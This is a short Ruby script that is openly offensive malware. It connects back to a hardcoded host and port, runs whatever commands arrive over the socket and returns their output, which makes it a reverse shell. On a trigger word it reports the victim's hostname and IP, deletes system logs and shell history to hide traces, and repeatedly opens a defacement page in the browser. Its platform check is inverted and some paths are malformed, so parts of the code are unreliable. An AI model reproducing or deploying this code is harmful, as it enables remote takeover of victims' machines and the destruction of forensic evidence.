#!/usr/bin/ruby

require "socket"
require_relative "launchy/lib/launchy"

host = "192.168.1.101"
port = "8001"

s = TCPSocket.open(host, port)

begin
  while true
    comm = s.gets.chomp
    if comm == "siahack"
      #system info
      host = Socket.gethostname
      ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
      s.puts("[*] Host name : #{host}")
      s.puts("[*] Ip Address : #{ip}")

      #Delete all logs
      if RUBY_PLATFORM =~ /win32/
        system("rm /var/log/messages")
        system("export HISTSIZE=0")
        system("shred -zu root/.bash_history")

      else
        #windows ....
      end
      
      while true
        #time to open browser :D
        sleep(5)
        #Address your deface :DDDD
        Launchy.open("/root/Desktop/sia-payload/deface.html")
      end
  end
  
  #send and run output :D
  res = %x{#{comm}}
  s.puts(res)
end



rescue 
  while true
    comm = s.gets.chomp
    if comm == "siahack"
      #system info
      host = Socket.gethostname
      ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
      s.puts("[*] Host name : #{host}")
      s.puts("[*] Ip Address : #{ip}")

      while true
        #time to open browser :D
        sleep(5)
        Launchy.open("file:///home/virus007/Desktop/deface.html")
      end
  end
  
  #send and run output :D
  res = %x{#{comm}}
  s.puts(res)
  end
end
